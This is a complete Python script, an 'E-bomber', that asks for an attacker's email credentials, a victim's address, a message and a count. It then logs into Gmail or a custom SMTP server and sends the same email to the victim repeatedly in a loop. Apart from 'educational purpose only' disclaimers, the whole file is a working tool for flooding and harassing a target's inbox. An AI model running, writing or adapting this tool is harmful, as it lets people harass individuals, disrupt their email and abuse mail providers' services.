#!/usr/bin/python3
#E-bomber
#This code for education purpose only.
#Use it at your own risk !!!
# Better Python Rewrite by Noctornal-Compiler

from os import urandom
import smtplib
from email.message import EmailMessage
from getpass import getpass
from simple_chalk import chalk, green
import sys
from time import sleep


print('                                                                    ')
print('                                                                    ')
print(chalk.yellow("$$$$$$$$\                      $$\$$\       $$$$$$$\                       $$\                         "))
print(chalk.yellow("$$  _____|                     \__$$ |      $$  __$$\                      $$ |                        "))
print(chalk.yellow("$$ |     $$$$$$\$$$$\  $$$$$$\ $$\$$ |      $$ |  $$ |$$$$$$\ $$$$$$\$$$$\ $$$$$$$\  $$$$$$\  $$$$$$\  "))
print(chalk.yellow("$$$$$\   $$  _$$  _$$\ \____$$\$$ $$ |      $$$$$$$\ $$  __$$\$$  _$$  _$$\$$  __$$\$$  __$$\$$  __$$\ "))
print(chalk.yellow("$$  __|  $$ / $$ / $$ |$$$$$$$ $$ $$ |      $$  __$$\$$ /  $$ $$ / $$ / $$ $$ |  $$ $$$$$$$$ $$ |  \__|"))
print(chalk.yellow("$$ |     $$ | $$ | $$ $$  __$$ $$ $$ |      $$ |  $$ $$ |  $$ $$ | $$ | $$ $$ |  $$ $$   ____$$ |      "))
print(chalk.yellow("$$$$$$$$\$$ | $$ | $$ \$$$$$$$ $$ $$ |      $$$$$$$  \$$$$$$  $$ | $$ | $$ $$$$$$$  \$$$$$$$\$$ |      "))
print(chalk.yellow("\________\__| \__| \__|\_______\__\__|      \_______/ \______/\__| \__| \__\_______/ \_______\__|      "))
print('\n\n')
print(chalk.red.bold("                         Please use this tool for educational purpose only.                            "))
print(chalk.red.bold("                   Github : https://github.com/Nocturnal-Compiler/Better-Email-Bomber                  "))
print('\n\n')
user = input(chalk.green('[1] ----> Anonymous name: '))
email = input(chalk.green('\n[2] ----> Attacker Email Address: '))
passwd = getpass(chalk.green.bold('\n[3] ----> Attacker Email Password: '))
to = input(chalk.red('\n[4] ----> Victim Email Address: '))
total = input(chalk.blue('\n[5] ----> Number of emails: '))
subject = input(chalk.blue('\n[7] ----> [Title Of The Email] Subject: '))
body = input(chalk.blue('\n[6] ----> Message: '))
Cserver = input(chalk.red('\n[+] Custom smtp server (leave blank to use gmail): '))

if not Cserver == '':
    defaultconf = False
    smtp_server = Cserver
    Cport = input('Custom smtp port (leave blank to use defaul port): ')
    if not Cport == '':
        port = int(Cport)
    else:
        port = 587
else:
    smtp_server = 'smtp.gmail.com'
    port = 587
    defaultconf = True


try:
    server = smtplib.SMTP(smtp_server, port)
    server.ehlo()
    server.starttls()
    server.login(email, passwd)
    for i in range(1, int(total) + 1):
        msg = EmailMessage()
        msg['Subject'] = subject
        msg['From'] = email
        msg['To'] = to
        msg.set_content(body)
        server.send_message(msg)
        print(chalk.green.bold("\r[+] E-mails sent: %i" % i))
        sleep(1)
        sys.stdout.flush()
    server.quit()
    print('\n Done !!!')
    sys.exit()
except KeyboardInterrupt:
    print(chalk.red('[-] Canceled'))
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print(chalk.red.bold('[!] The username or password you entered is incorrect'))
    sys.exit()
except smtplib.SMTPConnectError:
    print(chalk.red.bold('\n[!] Failed to connect with the SMTP server'))
    sys.exit()
